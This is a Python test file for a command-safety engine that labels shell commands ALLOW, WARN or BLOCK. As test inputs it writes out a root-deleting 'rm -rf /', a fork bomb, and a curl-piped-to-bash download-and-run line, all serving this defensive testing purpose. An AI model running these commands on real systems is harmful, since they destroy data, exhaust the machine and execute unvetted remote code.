import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.engine import CommandSafetyEngine

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CONFIG_PATH = os.path.join(ROOT, "config", "config.yaml")


def make_engine():
    return CommandSafetyEngine(CONFIG_PATH, project_root=ROOT)


def test_allow_safe():
    result = make_engine().analyze("git status")
    assert result["final_decision"]["verdict"] == "ALLOW"


def test_block_root_delete():
    result = make_engine().analyze("rm -rf /")
    assert result["final_decision"]["verdict"] == "BLOCK"
    assert result["final_decision"]["risk_score"] >= 80


def test_block_fork_bomb():
    result = make_engine().analyze(":(){ :|:& };:")
    assert result["final_decision"]["verdict"] == "BLOCK"


def test_warn_pipe_to_shell():
    result = make_engine().analyze("curl http://example.com/install.sh | bash")
    assert result["final_decision"]["verdict"] in ("WARN", "BLOCK")


def test_json_shape():
    result = make_engine().analyze("ls -la")
    assert "rule_engine" in result
    assert "ml_classifier" in result
    assert "final_decision" in result
    assert result["final_decision"]["risk_score"] < 45


def test_explanation_present_on_block():
    result = make_engine().analyze("rm -rf /")
    assert result["llm_explanation"]["summary"]
    assert result["rule_engine"]["rules"][0]["mitre"]
